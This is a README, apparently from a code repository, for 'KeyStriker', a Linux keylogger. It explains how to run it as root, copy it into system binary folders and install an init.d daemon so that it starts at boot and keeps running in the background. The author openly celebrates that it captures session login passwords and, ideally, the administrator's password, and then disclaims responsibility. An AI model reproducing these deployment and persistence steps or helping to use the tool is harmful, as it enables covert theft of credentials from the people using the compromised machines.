# Keylloger-KeyStriker
A linux complet keyloger wish can be laucnh at startup.

Hello everyones,

Here is my keylogger called KeyStriker, no installation needed, only few things to know for make it work.

Decompress the archive where you want to, then open a terminal and enter : sudo ./KeyStriker
The log file is in /var/log folder, the file is called KeyStriker.log

For launch the keylogger at startup, follow this steps :

1) copy/paste KeyStriker in /usr/bin and /usr/sbin

2) in the folder called script you will find a file called daemon_launcher.sh you must copy/paste this file in /etc/init.d
Once you made this you can add the keylogger to startup using the script called startup.sh.If you want to delete from startup the keylogger use the script delete_startup.sh.

You're done.

You have in script folder a folder called script_de_controle, inside you can manipulate/controle the keylogger for exemple for stop it : use the script daemon_stop.sh for restart the keylogger use : daemon_restart.sh ect ect...The status script aka daemon_status.sh show if the keyllogger is running or not.

If you want at any time see if the keylogger is really running you can enter in a terminal this command : ps -aux | grep KeyStriker, if you see a line like this :

root 3317 0.0 0.0 4364 76 ? Ss 07:29 0:00 KeyStriker

The keylogger is running.

As my keylogger can be launched at startup it log the user's password needed for start any linux session, and as it's daemonized he turn in background infinitly, wish mean you can catch some other password or the graal the adminstrator's one, olé !!!!

Enjoy this software, and by the way iam not responsable of the use you do with it, large power mean big responsability never forget.

Thanks.
